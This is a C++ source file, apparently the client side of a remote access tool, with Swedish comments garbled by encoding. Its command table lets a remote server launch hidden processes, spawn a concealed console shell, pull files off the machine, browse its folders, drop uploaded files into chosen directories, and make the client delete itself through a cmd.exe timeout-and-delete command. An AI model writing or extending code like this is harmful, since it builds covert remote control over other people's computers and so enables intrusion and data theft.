#pragma once
#include "precompile.h"
#include "client.h"
#include "shell_process.h"
#include "payloads.h"

response_table client::get_responses()
{
	return {
		{"process-v", payload::process_execution_show}, // f�r att starta en process
		{"process-h", payload::process_execution_hidden}, // f�r att starta en g�md process
		{"download", payload::download_file} // f�r att �ver f�ra en fil till servern
	};
}

action_table client::get_actions()
{
	return {
		{"exit", [&](std::string data) { exit(0); }}, // f�r att st�nga ner klienten
		{"uninstall", [&](std::string) { // f�r att avinstallera klienten
			payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::filesystem::current_path().string() + "\\client.exe", true); exit(0);
		}},
		{"select", [&](std::string data) { // f�r att v�lja fil/mapp �t servern
			directory manager(data); //antag data �r bas directory
			helper::send_directory(client_implentation, manager.current_directory()); // skicka bas mappen

			packet paket = client_implentation.receive_packet(); // ta emot respons
			while (paket.id != "dir_action" && paket.data != "done") { // medans server inte �r klar, klienten kommer aldrig att fastna i den h�r loppen eftersom att den kallar recv vilket g�r att den kan ominitializera instansen
				std::cout << "recv()[" << paket.id << "|" << paket.data << "]" << std::endl;
				if (!paket.id.empty() && !paket.data.empty()) { // paketet inte �r tomt
					if (paket.id == "goto" && std::all_of(paket.data.begin(), paket.data.end(), isdigit)) { // om vi ska g� in i en undermapp
						helper::send_directory(client_implentation, manager.descend(std::stoi(paket.data))); // g� in och skicka undermappen
					}
				}
				paket = client_implentation.receive_packet(); // ta emot n�sta instruktion fr�n servern
			}
		}},
		{"upload", [&](std::string data) {
			auto [file, folder] = helper::ArgSplit(data, '|');
			std::ofstream output(folder + "\\" + std::filesystem::path(file).filename().string(), std::ios::binary); // �ppna en filen som ska motas

			if (output.good()) { // om det g�r att �ppna filen p� den platsen
				client_implentation.send({ "upload_status", "Ok" });
			}
			else { // annars g�r det inte att �ppna pga kanske fel �gare av mappen eller skrivr�ttigheter
				client_implentation.send({ "upload_status", ":<" });
				return;
			}

			packet file_data = client_implentation.receive_packet(); // ta emot filen

			output << file_data.data; // skriv filen

			output.close(); // st�ng filen
			
		}},
		{"shell-init", [&](std::string data)
		{
			auto [shell, cwd] = helper::ArgSplit(data, '|');

			properties prop{
				shell,
				cwd,
				CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
				STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
				SW_HIDE,
				false
			};

			shell_process process(prop);
		}}
	};
}